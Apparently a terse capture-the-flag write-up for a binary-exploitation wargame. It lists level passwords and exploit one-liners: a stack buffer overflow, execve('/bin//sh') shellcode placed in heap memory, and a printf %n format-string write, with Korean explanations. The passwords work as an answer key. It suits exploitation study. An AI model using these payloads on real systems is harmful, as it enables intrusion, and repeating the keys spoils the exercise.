> level0 - level0

> level1 - 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

```shell
(gdb) print ($ebp + 4) - ($esp + 0x10)
result: 76

$ cat <(python -c 'print "A" * 76 + "\x44\x84\x04\x08",') - | ./level1
cat /home/user/level2/.pass
```


> level2 - 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

```bash
cat <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + ("A" * 52)  + "\x08\xa0\x04\x08"') - | ./level2
```

대부분의 메모리 영역(스택, 동적 라이브러리)이 0xb???????위치에 존재하는데, 이 위치에서의 실행을 막는 코드가 내장되어있다. 따라서 malloc의 매핑 주소(코드 상의 \x08\xa0\x04\x08 부분)에 shellcode를 주입하는 방식으로 해결

> level3 - 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

printf의 첫 번째 인자가 우리가 직접 넣어줄 수 있는 문자열이다.
따라서 printf의 %n 모디파이어를 이용해서 특정 주소의 쓰기 작업이 가능하다

```bash
cat <(python -c 'print "\x8c\x98\x04\x08%020p%020p%020p%n",') - | ./level3
```

> level4 - b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

